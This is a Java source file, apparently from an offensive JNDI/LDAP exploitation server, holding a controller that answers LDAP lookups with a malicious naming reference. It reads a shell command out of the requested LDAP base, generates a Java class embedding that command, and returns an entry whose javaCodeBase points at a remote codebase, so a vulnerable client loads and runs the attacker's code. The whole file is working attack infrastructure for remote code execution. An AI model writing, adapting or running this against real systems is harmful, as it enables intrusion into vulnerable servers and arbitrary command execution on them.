package com.xen0vas.ldap.controllers;

import com.xen0vas.ldap.template.CommandTemplate;
import com.xen0vas.ldap.utils.Config;
import com.xen0vas.ldap.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

@LdapMapping(uri = { "/" })
public class BasicController implements LdapController {

    private String codebase = Config.codeBase;
    private String[] params;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
    
        Entry e = new Entry(base);
        String className = "";
        
        CommandTemplate commandTemplate = new CommandTemplate(params[0]);
        commandTemplate.cache();
        className = commandTemplate.getClassName();
        
        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaCodeBase", this.codebase);
        e.addAttribute("objectClass", "javaNamingReference");
        e.addAttribute("javaFactory", className);
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) {
            int fistIndex = base.indexOf("/");
            int secondIndex = base.indexOf("/", fistIndex + 1);
            if(secondIndex < 0) secondIndex = base.length();
            
            String cmd = null;
			try {
				cmd = Util.getCmdFromBase(base);
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
            params = new String[]{cmd};  
    }
}
